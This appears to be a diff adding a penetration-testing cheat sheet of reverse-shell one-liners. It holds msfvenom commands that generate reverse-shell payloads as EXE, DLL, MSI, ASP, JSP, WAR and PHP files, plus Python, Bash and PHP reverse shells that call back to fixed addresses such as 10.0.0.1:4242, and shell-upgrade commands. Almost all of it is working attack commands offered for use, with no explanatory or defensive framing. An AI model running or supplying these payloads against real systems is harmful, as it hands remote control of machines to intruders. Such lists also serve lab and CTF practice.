@@ -1,0 +1,24 @@
+
+msfvenom
+Generate windows/shell/reverse\_tcp (x86 exe):msfvenom -p windows/shell/reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f exe \> shell-x86.exe
+Generate windows/x64/shell\_reverse\_tcp (x64 exe):msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f exe \> shell-x64.exe
+Generate windows/shell/reverse\_tcp (asp):msfvenom -p windows/shell/reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f asp \> shell.asp
+Generate java/jsp\_shell\_reverse\_tcp (jsp):msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f raw \> shell.jsp
+Generate java/jsp\_shell\_reverse\_tcp (war):msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<PORT\> -f war \> shell.war
+Generate php/reverse\_php (php):msfvenom -p php/reverse\_php LHOST=\<IP\> LPORT=\<PORT\> -f raw \> shell.php
+Generate DLL reverse shell (x64):msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=\<attaker-IP\> LPORT=\<listening-port\> -f dll \> filename.dll
+Generate AlwaysInstallElevated reverse shell (msi):msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<port\> --platform windows -f msi \> reverse.msi
+perl
+Perl TTY shell:perl -e 'exec "/bin/sh";'
+python
+Python TTY shell:python -c 'import pty; pty.spawn("/bin/bash")'
+Python3 TTY shell:python3 -c 'import pty; pty.spawn("/bin/bash")'
+Python reverse shell:python -c 'import socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+shell
+Bash reverse shell:bash -i \>& /dev/tcp/10.0.0.1/4242 0\>&1
+PHP reverse shell (command):\<?php echo shell\_exec('bash -i \>& /dev/tcp/10.11.0.106/443 0\>&1');?\>
+Bash TTY shell:echo 'os.system('/bin/bash')'
+Basic shell:/bin/sh -i
+Bash interactive shell:/bin/bash -i
+Find files in Windows (CTF Style):cd c:\\Users
+Tree files in Windows:tree /F
